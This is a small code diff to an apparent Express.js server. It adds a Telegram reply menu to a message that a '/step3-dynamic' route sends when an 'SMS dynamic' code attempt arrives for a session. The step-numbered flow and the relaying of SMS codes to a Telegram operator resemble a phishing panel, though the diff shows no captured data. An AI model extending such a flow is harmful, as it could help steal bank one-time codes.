@@ -284,7 +284,8 @@ app.post('/step3-dynamic', async (req, res) => {
 
     await axios.post(getTelegramApiUrl('sendMessage'), {
       chat_id: CHAT_ID,
-      text: mensaje
+      text: mensaje,
+	  reply_markup: getDynamicMenu(session)	
     });
 
     console.log(`✅ Dinámica SMS laboratorio  ${attemptNumber} enviada - Session: ${sessionId}`);
